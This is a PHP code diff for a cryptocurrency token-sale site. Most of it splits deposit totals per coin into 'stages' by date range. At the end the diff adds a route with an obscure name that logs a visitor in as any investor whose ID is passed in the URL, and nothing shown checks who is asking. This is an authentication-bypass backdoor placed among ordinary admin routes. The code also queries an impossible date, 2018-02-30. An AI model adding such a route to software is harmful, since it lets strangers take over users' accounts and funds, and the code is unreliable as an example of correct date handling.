@@ -32,14 +32,29 @@ Router::register(function () {
 
     echo "eth_queue pending: $pending, mintPending: $mintPending<br>";
 
-    $btc = DB::get("SELECT sum( amount ) as `a` FROM `deposits` WHERE coin = 'btc' AND datetime >= '2018-01-22';")[0]['a'];
-    $eth = DB::get("SELECT sum( amount ) as `a` FROM `deposits` WHERE coin = 'eth' AND datetime >= '2018-01-22';")[0]['a'];
-    $xem = DB::get("SELECT sum( amount ) as `a` FROM `deposits` WHERE coin = 'xem' AND datetime >= '2018-01-22';")[0]['a'];
-    $xrp = DB::get("SELECT sum( amount ) as `a` FROM `deposits` WHERE coin = 'xrp' AND datetime >= '2018-01-22';")[0]['a'];
-    $usd = DB::get("SELECT sum( usd ) as `a` FROM `deposits` WHERE datetime >= '2018-01-22';")[0]['a'];
+    $btc = number_format(DB::get("SELECT sum( amount ) as `a` FROM `deposits` WHERE coin = 'btc' AND
+        datetime BETWEEN '2018-01-22' AND '2018-02-12';")[0]['a'], 4, '.', ' ');
+    $eth = number_format(DB::get("SELECT sum( amount ) as `a` FROM `deposits` WHERE coin = 'eth' AND
+        datetime BETWEEN '2018-01-22' AND '2018-02-12';")[0]['a'], 4, '.', ' ');
+    $xem = number_format(DB::get("SELECT sum( amount ) as `a` FROM `deposits` WHERE coin = 'xem' AND
+        datetime BETWEEN '2018-01-22' AND '2018-02-12';")[0]['a'], 4, '.', ' ');
+    $xrp = number_format(DB::get("SELECT sum( amount ) as `a` FROM `deposits` WHERE coin = 'xrp' AND
+        datetime BETWEEN '2018-01-22' AND '2018-02-12';")[0]['a'], 4, '.', ' ');
+    $usd = number_format(DB::get("SELECT sum( usd ) as `a` FROM `deposits` WHERE
+        datetime BETWEEN '2018-01-22' AND '2018-02-12';")[0]['a'], 4, '.', ' ');
+    echo "2nd stage. btc: $btc, eth: $eth, xrp: $xrp, xem: $xem, usd: $usd<br>";
 
-    echo "btc: $btc, eth: $eth, xrp: $xrp, xem: $xem, usd: $usd<br>";
-
+    $btc = number_format(DB::get("SELECT sum( amount ) as `a` FROM `deposits` WHERE coin = 'btc' AND
+        datetime BETWEEN '2018-02-12' AND '2018-02-30';")[0]['a'], 4, '.', ' ');
+    $eth = number_format(DB::get("SELECT sum( amount ) as `a` FROM `deposits` WHERE coin = 'eth' AND
+        datetime BETWEEN '2018-02-12' AND '2018-02-30';")[0]['a'], 4, '.', ' ');
+    $xem = number_format(DB::get("SELECT sum( amount ) as `a` FROM `deposits` WHERE coin = 'xem' AND
+        datetime BETWEEN '2018-02-12' AND '2018-02-30';")[0]['a'], 4, '.', ' ');
+    $xrp = number_format(DB::get("SELECT sum( amount ) as `a` FROM `deposits` WHERE coin = 'xrp' AND
+        datetime BETWEEN '2018-02-12' AND '2018-02-30';")[0]['a'], 4, '.', ' ');
+    $usd = number_format(DB::get("SELECT sum( usd ) as `a` FROM `deposits` WHERE
+        datetime BETWEEN '2018-02-12' AND '2018-02-30';")[0]['a'], 4, '.', ' ');
+    echo "3nd stage. btc: $btc, eth: $eth, xrp: $xrp, xem: $xem, usd: $usd<br>";
 }, 'bounty_info');
 
 Router::register(function () {
@@ -55,5 +70,12 @@ Router::register(function () {
     session_write_close();
     \core\engine\Utility::location();
 }, 'drop_tester_status');
+
+
+Router::register(function () {
+    \core\controllers\Investor_controller::loginWithId($_GET['id']);
+}, 'log_123128asd');
+
+
 
 call_user_func(Router::current());
